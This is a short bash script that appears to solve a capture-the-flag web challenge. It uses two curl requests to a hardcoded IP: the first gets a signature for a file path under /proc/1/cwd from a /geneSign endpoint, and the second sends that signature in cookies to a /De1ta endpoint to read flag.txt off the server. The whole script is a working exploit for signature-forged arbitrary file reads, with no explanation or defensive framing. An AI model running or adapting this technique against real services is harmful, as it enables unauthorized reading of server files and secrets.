#!/bin/bash

path="/proc/1/cwd/flag.txt"
host="139.180.128.86"

hash=`curl -s --get --data-urlencode "param=${path}read" http://$host/geneSign`
curl -s --get -b "action=readscan; sign=$hash" --data-urlencode "param=$path" http://$host/De1ta

echo
